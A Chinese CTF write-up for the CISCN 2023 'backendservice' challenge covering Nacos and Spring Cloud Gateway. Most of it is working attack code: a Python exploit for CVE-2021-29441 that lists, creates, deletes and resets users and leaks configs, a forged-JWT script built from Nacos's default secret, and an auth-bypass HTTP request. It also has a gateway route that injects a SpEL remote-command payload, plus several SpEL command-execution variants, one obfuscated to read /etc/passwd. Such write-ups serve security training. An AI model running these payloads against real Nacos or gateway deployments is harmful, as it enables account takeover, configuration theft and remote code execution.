---
layout: post
title: ciscn2023 backendservice
date: 2023-06-04 14:12 +0800
categories: [pentest, nacos]
tag: [web, nacos]
---

## 题目描述
* 题目地址是一个nacos
* 内网一个jar包，给了源码

## 环境搭建
* vulhub找CVE-2021-29441
* pull下来后，env文件夹找到NACOS_AUTH_ENABLE改成false，因为这道题的jar包没有配置认证所需要的信息（用户名、密码或authtoken之类的）


<details markdown="1">
  <summary>pom.xml</summary>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>test1</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-actuator</artifactId>
            <version>2.6.6</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <version>2.6.6</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter-loadbalancer</artifactId>
            <version>3.1.1</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-webflux</artifactId>
            <version>2.6.6</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>
            <version>0.9.0.RELEASE</version>
            <exclusions>
                <exclusion>
                    <groupId>com.alibaba.nacos</groupId>
                    <artifactId>nacos-client</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter</artifactId>
            <version>3.0.5</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-gateway-server</artifactId>
            <version>3.0.5</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-web</artifactId>
            <version>5.3.14</version>
        </dependency>
        <dependency>
            <groupId>com.alibaba.cloud</groupId>
            <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>
            <version>2.2.6.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>com.alibaba.nacos</groupId>
            <artifactId>nacos-client</artifactId>
            <version>1.4.2</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter-bootstrap</artifactId>
            <version>3.1.1</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-commons</artifactId>
            <version>3.1.1</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>5.3.18</version>
        </dependency>

        <dependency>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
            <version>1.29</version>
        </dependency>
    </dependencies>
</project>
```
</details>

## nacos历史漏洞

### 默认密码
nacos/nacos

### CVE-2021-29441
该漏洞发生在Nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。并且利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息。

影响版本:
Nacos <= 2.0.0-ALPHA.1

漏洞类型：
* 获取已有的用户列表的账号和密码
* 任意用户添加
* 任意用户删除
* 任意用户密码重置
* 配置信息泄露


exp:
```python
import requests,json
headers = {
    'User-Agent':'Nacos-Server'
}
def list_users():
    r = requests.get(
        url = 'http://god.cc:8888/nacos/v1/auth/users?pageNo=1&pageSize=9',
        headers = headers
    )
    print(json.dumps(r.json(),indent=4))
    
def create_user(username,password):
    r = requests.post(
        url = f'http://god.cc:8888/nacos/v1/auth/users?username={username}&password={password}',
        headers = headers
    )
    print(json.dumps(r.json(),indent=4))
    
def modify_password(username,newpassword):
    r = requests.put(
        url = f'http://god.cc:8888/nacos/v1/auth/users?accessToken=&username={username}&newPassword={newpassword}',
        headers = headers
    )
    print(json.dumps(r.json()['message'],indent=4))

def delete_user(username,password):
    r = requests.delete(
        url = f'http://god.cc:8888/nacos/v1/auth/users?accessToken=&username={username}&password={password}',
        headers = headers
    )
    print(json.dumps(r.json()['message'],indent=4))

    
def leak_config():
    r = requests.get(
        url = 'http://god.cc:8888/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99',
        headers = headers
    )
    print(json.dumps(r.json(),indent=4))
    
if __name__ == "__main__":
    list_users()
    # delete_user('qaxtest','qaxtest@123')
    # modify_password('nacos','aaa')
    create_user('qaxtest','qaxtest@123')
    # list_users()
    # leak_config()
```

### CVE-2021-29441的绕过
[参考](https://blog.csdn.net/m0_52987358/article/details/112830030)

`curl -X GET 'http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9'`

### 默认自定义身份识别标志
```
POST /nacos/v1/auth/users HTTP/1.1
Host: 192.168.31.112:8848
Content-Type: application/x-www-form-urlencoded
serverIdentity: security
Content-Length: 31

username=test05&password=test05
```


```python
import jwt,time
def create_user(username,password):
    r = requests.post(
        url = f'http://god.cc:8888/nacos/v1/auth/users',
        data = {
            'username':username,
            'password':password
        },
        headers = {
            'serverIdentity': 'security'
        }
    )
    print(json.dumps(r.json(),indent=4))

print(create_user('aaa','bbb'))

```

### QVD-2023-6271

0.1.0<=Nacos<=2.2.0

默认JWT-secret：`SecretKey012345678901234567890123456789012345678901234567890123456789`

[参考](https://xz.aliyun.com/t/12313)

```java
import io.jsonwebtoken.io.Decoders;
public class Test {
    public static String bytesToHex(byte[] bytes) {
        StringBuffer sb = new StringBuffer();
        for(int i = 0; i < bytes.length; i++) {
            String hex = Integer.toHexString(bytes[i] & 0xFF);
            if(hex.length() < 2){
                sb.append(0);
            }
            sb.append(hex);
        }
        return sb.toString();
    }
    public static void main(String args[]){
        System.out.println(bytesToHex(Decoders.BASE64.decode("SecretKey012345678901234567890123456789012345678901234567890123456789")) );
    }

}
/*
49e72b7ad29ecb4d76df8e7aefcf74d76df8e7aefcf74d76df8e7aefcf74d76df8e7aefcf74d76df8e7aefcf74d76df8e7aefc
*/
```

```python
import jwt,time,base64
def get_fake_auth():
    return jwt.encode(
        payload = {
            "sub":"nacos",
            "exp":int(time.time()) + 24 * 60 * 60
        },
        key=bytes.fromhex('49e72b7ad29ecb4d76df8e7aefcf74d76df8e7aefcf74d76df8e7aefcf74d76df8e7aefcf74d76df8e7aefcf74d76df8e7aefc'),
        algorithm = 'HS256'        
    )

def create_user(username,password):
    r = requests.post(
        url = f'http://god.cc:8888/nacos/v1/auth/users?accessToken=' + get_fake_auth(),
        data=  {
            'username':username,
            'password':password
        }
    )
    print(json.dumps(r.json(),indent=4))

print(get_fake_auth())
```


## 解题过程

jar包丢到idea里去，发现bootstrap.yml中有如下内容
```yaml
spring:
  cloud:
    nacos:
      discovery:
        server-addr: 127.0.0.1:8888
      config:
        name: backcfg
        file-extension: json
        group: DEFAULT_GROUP
        server-addr: 127.0.0.1:8888
```

[spring-cloud-gateway-rce](https://xz.aliyun.com/t/11493#toc-5)
```yaml
spring:
  cloud:
    gateway:
      routes:
        - id: exam
          order: 0
          uri: lb://service-provider
          predicates:
            - Path=/echo/**
          filters:
            - name: AddResponseHeader
              args:
                name: result
                value: "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'id'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}"

```
[yaml转json](https://onlineyamltools.com/convert-yaml-to-json)
```json
{
  "spring": {
    "cloud": {
      "gateway": {
        "routes": [
          {
            "id": "exam",
            "order": 0,
            "uri": "lb://service-provider",
            "predicates": [
              "Path=/echo/**"
            ],
            "filters": [
              {
                "name": "AddResponseHeader",
                "args": {
                  "name": "result",
                  "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'id'}).getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
                }
              }
            ]
          }
        ]
      }
    }
  }
}
```

## SPEL


```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
public class StartApp {
    public static void main(String[] args) {
        String cmdStr = "T(java.lang.Runtime).getRuntime().exec(\"open /System/Applications/Calculator.app\")";
        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}

```

```java
T(java.lang.Runtime).getRuntime().exec("open /System/Applications/Calculator.app")

// 使用string数组 (java.lang包下的类不需要加全限定类名)
T(Runtime).getRuntime().exec(new String[]{"open","/System/Applications/Calculator.app"})

new ProcessBuilder(new String[]{"open","/System/Applications/Calculator.app"}).start()

new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("s=[2];s[0]='open';s[1]='/System/Applications/Calculator.app';java.lang.Runtime.getRuntime().exec(s);")

T(ClassLoader).getSystemClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("open /System/Applications/Calculator.app")

''.class.forName("java.lang.Runtime").getRuntime().exec("open /System/Applications/Calculator.app")

T(com.gateway.StartApp).getClass().forName("java.lang.Runtime").getRuntime().exec("open /System/Applications/Calculator.app")

// python -> "(" + ").concat(".join([f"T(java.lang.Character).toString({x})" for x in list(b"id")]) + ")"
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())

```


## jar包重打包
* 将JAR包进行解压
`jar -xf test.jar`

* 重新打成JAR包

```bash
jar -cf0M test.jar *
附：jar命令注释：
-c 创建新的归档文件
-t 列出归档目录和文件
-x 解压缩已归档的指定(或所有)文件
-u 更新现有的归档文件
-v 在标准输出中生成详细输出 / 提供更详细输出信息
-f 指定归档文件名 / 为压缩包指定名字
-m 包含指定清单文件中的清单信息
-e 为捆绑到可执行 jar 文件的独立应用程序
-M, --no-manifest          不为条目创建清单文件
-0, --no-compress          仅存储; 不使用 ZIP 压缩
```